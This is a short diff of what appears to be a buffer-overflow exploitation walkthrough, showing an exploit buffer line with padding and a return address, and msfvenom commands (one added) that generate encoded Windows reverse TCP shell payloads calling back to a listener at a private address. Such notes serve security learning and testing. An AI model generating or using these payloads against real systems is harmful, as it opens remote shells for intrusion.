@@ -43,6 +43,8 @@ buf += "A"*146 + "\x9d\xdc\x25\x77" + "C"*(2600-146-4)
 
 ```
 msfvenom --payload windows/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 --bad-chars '\x00\x0a' -f C
+
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.28.128 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a"
 ```
 
 ### 7. Update/inject this payload in the script
